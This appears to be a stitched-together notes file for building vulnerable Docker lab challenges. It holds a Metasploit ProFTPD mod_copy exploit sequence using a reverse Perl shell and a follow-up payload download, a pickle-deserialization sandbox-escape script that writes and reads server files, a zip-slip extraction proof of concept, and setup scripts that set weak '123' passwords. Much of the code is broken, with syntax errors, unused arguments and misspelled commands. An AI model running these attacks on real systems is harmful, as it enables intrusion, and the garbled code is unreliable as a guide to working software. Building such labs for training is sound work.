# Proftp: The Proftp docker vm: https://github.com/t0kx/exploit-CVE-2015-3306.git

# solution to proftp with apache
metasploit: 
use unix/ftp/proftp_modecopy_exec
set sitepath /var/www/html
show payloads
set payload cmd/unix/reverse_perl 
# after running you get cmd.
# then the attacker needs to use curl to download msvenum payload.

# Create proftp:
container_name=proftp_with_apache_$1
docker build -t vuln/cve-2015-3306 .
docker run --rm -idt --name $container_name vuln/cve-2015-3306
docker cp ./installations.sh $container_name:/home/installations.sh
docker exec -it $container_name sh installations.sh


# =========================================================================================


# =========================================================================================


# =========================================================================================

# Sanbox escape challenge solution
import pickle
import requests
from asd import hi
import base64
url = "http://127.0.0.1:5000/submit_form"

def send(payload):
	data = {"calculation_to_preform": "payload"}
	x = requests.post(url, data=data)
	print(x.text)

def generate_pickle_payload()
	return pickle.dumps(hi)

def write_file(data):
	with open("asd.py", "r") as fp:
		data = fp.read()
		payload = 'open("/path/to/dockerexercise/asd.py", "w").__getattribute__("etriw"[::-1])({})'.format(base64.b64encode(data))
		# Now send the pickle file.

def execute_payload():
	pickle_payload = generate_pickle_payload()
	print(pickle_payload)
	payload = "pickle.loads({})()".format(pickle_payload)
	send(payload)

def turn_to_whitebox():
	payload = 'open("path/to/server.py", "r").__getattribute__("daer"[::-1])()'
	send(payload)

def main():
	write_file()
	execute_payload()

if __name__ == "__main__":
	main()

# =========================================================================================

apt update 
apt install -y python3 python3-pip
pip3 intsall flask flask_cors

# =========================================================================================

# This will create the python sandbox container
container_name=python_sandbox_$1
docker run --rm -idt --name $container_name ubuntu
docker cp ./installations.sh $container_name:/home/installations.sh
docker exec -it $container_name sh installations.sh

# =========================================================================================

python3 -c "print('123\n123')" | passwd
python3 -c "print('123\n123')" | adduser moses
usermode -aG sudo moses
service ssh start
ifconfig

# =========================================================================================

# This is the first webserver challenge
# The phpmailer version is 5.2.17
apt update
# in the apache installation you need to insert the timezone
apt install -y net-tools apache2 php 
# Create the ssh keys - openssl req -x509-newkey rsa:4096 -nodes -out ssl_cert.crt -keyout ssl_key.key -subj "/C=US/ST=Utah/L=Lehi/)=Bamba Corp./OU=IT/CN=bamba.com" -days 1000
<VirtualHost *:443>
    DocumentRoot /var/www/html
    ServerName www.bamba.com
    SSLEngine on
    SSLCertificateFile /path/to/your_domain_name.crt
    SSLCertificateKeyFile /path/to/your_private.key
</VirtualHost>	

# =========================================================================================

# Zip slip python poc code
import tarfile
tf = tarfile.TarFile("zip-slip.tar")
tf.list()
tf.extractall()

# =========================================================================================

# This will create the zip slip container
container_name=zip_slip_$1
docker run --rm -idt --name $container_name ubuntu
docker cp ./installations.sh $container_name:/home/installations.sh
docker exec -it $container_name sh installations.sh

# =========================================================================================

# installations.sh for zip slip vulnerability.
cd /home/fileserver
apt update
apt install -y curl tar

curl -O https://www.python.org/ftp/python/3.6.0/Python-3.6.0.tgz
tar -xvzf Python-3.6.0.tgz
cd Python-3.6.0
./configure
make
sudo make install

# =========================================================================================
# =========================================================================================
# =========================================================================================

